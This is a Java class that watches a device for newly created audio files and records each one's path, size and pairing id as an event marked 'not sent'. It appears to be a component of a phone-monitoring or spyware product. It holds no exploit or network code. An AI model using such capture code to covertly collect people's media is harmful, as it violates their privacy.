package com.vvt.audioc;

import java.io.IOException;
import com.vvt.event.FxAudioFileThumbnailEvent;
import com.vvt.event.FxEventCapture;
import com.vvt.event.constant.FxStatus;
import com.vvt.mediamon.MediaMonitor;
import com.vvt.mediamon.MediaMonitorListener;
import com.vvt.mediamon.info.MediaInfo;
import com.vvt.mediamon.info.MediaInfoType;
import com.vvt.std.FileUtil;
import com.vvt.std.Log;

public class AudioCapture extends FxEventCapture implements MediaMonitorListener {
	
	private final String TAG = "AudioCapture"; 
	private MediaMonitor mediaMon = new MediaMonitor();

	public void startCapture() {
		try {
//			Log.debug(TAG + ".startCapture()", "isEnabled: " + isEnabled() + "sizeOfFxEventListener: " + sizeOfFxEventListener());
			if (!isEnabled() && sizeOfFxEventListener() > 0) {
//				Log.debug(TAG + ".startCapture()", "ENTER");
				mediaMon.addMediaMonitorListener(this);
				mediaMon.start();
				setEnabled(true);
			}
		} catch(Exception e) {
			Log.error(TAG + ".startCapture()", e.getMessage(), e);
			resetMadiaCapture();
			notifyError(e);
		}
	}
	
	public void stopCapture() {
		try {
			if (isEnabled()) {
				mediaMon.removeMediaMonitorListener(this);
				mediaMon.stop();
				setEnabled(false);
			}
		} catch(Exception e) {
			Log.error(TAG + ".stopCapture()", e.getMessage(), e);
			resetMadiaCapture();
			notifyError(e);
		}
	}

	public void destroy() {
		mediaMon.destroy();
	}
	
	private void resetMadiaCapture() {
		setEnabled(false);
		mediaMon.removeMediaMonitorListener(this);
	}
	
	private void initFxAudioFileThumbnailEvent(MediaInfo mediaInfo) {
		// To set event time.
		FxAudioFileThumbnailEvent fxAudioFileThumbEvent = new FxAudioFileThumbnailEvent();
		fxAudioFileThumbEvent.setEventTime(System.currentTimeMillis());
		fxAudioFileThumbEvent.setPairingId(mediaInfo.getParingId());
		fxAudioFileThumbEvent.setFormat(mediaInfo.getFxMediaTypes());
		fxAudioFileThumbEvent.setFilePath(mediaInfo.getThumbPath());
		fxAudioFileThumbEvent.setActualSize(getActualSize(mediaInfo.getActualPath()));
		fxAudioFileThumbEvent.setActualDuration(0);
		fxAudioFileThumbEvent.setStatus(FxStatus.NOT_SEND);
		// To notify event.
		notifyEvent(fxAudioFileThumbEvent);	
	}
	
	// TODO: Debug log
	private void saveLog(MediaInfo mediaInfo) {
		Log.debug(TAG, "getActualName: " + mediaInfo.getActualName());
		Log.debug(TAG, "getActualPath: " + mediaInfo.getActualPath());
		Log.debug(TAG, "getThumbPath: "+ mediaInfo.getThumbPath());
		Log.debug(TAG, "getParingId: " + mediaInfo.getParingId());
		Log.debug(TAG, "getFxMediaTypes: " + mediaInfo.getFxMediaTypes().getId());
		Log.debug(TAG, "getMediaInfoType: " + mediaInfo.getMediaInfoType().getId());
	}
	
	private long getActualSize(String filePath) {
		long size = 0;
		try {
			size = FileUtil.getFileSize(filePath);
		} catch (IOException e) {
			Log.error(TAG + ".getActualSize()", e.getMessage(), e);
			e.printStackTrace();
		}
		return size;
	}
	
	// MediaMonitorListener
	public void mediaCreated(MediaInfo mediaInfo) {
//		saveLog(mediaInfo);
		if (mediaInfo.getMediaInfoType() == MediaInfoType.AUDIO_THUMBNAIL) {
			initFxAudioFileThumbnailEvent(mediaInfo);
		} 
	}

}
